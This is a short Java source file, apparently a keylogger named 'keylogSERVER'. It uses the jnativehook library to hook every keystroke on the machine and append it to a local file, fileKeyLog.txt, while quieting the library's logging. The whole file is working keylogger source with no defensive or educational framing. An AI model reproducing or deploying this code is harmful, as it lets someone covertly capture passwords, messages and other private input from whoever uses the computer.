import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.nio.file.*;
import java.util.logging.Level;


import org.jnativehook.*;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;



public class keylogSERVER implements NativeKeyListener{

	private static final Path file = Paths.get("fileKeyLog.txt");
	private static final Logger logger = LoggerFactory.getLogger(keylogSERVER.class);
	
	public static void main(String[] args) {

		logger.info("Key logger has been started");

		init();
		
		
		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			logger.error(e.getMessage(), e);
			System.exit(-1);
		}
		
		GlobalScreen.addNativeKeyListener(new keylogSERVER());
	}

	private static void init() {
		
		// Get the logger for "org.jnativehook" and set the level to warning.
		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);

		// Don't forget to disable the parent handlers.
		logger.setUseParentHandlers(false);
	}

	
 
	 public void nativeKeyPressed(NativeKeyEvent e) {
		String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
		
		try (OutputStream os = Files.newOutputStream(file, StandardOpenOption.CREATE, StandardOpenOption.WRITE,
				StandardOpenOption.APPEND); PrintWriter writer = new PrintWriter(os)) {
				
			if (keyText.length() > 1) {
				writer.print("[" + keyText + "]");
			} else {
				writer.print(keyText);
			}
		
			
		} catch (IOException ex) {
			logger.error(ex.getMessage(), ex);
			System.exit(-1);
		}
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		// TODO Auto-generated method stub
		
	}
}

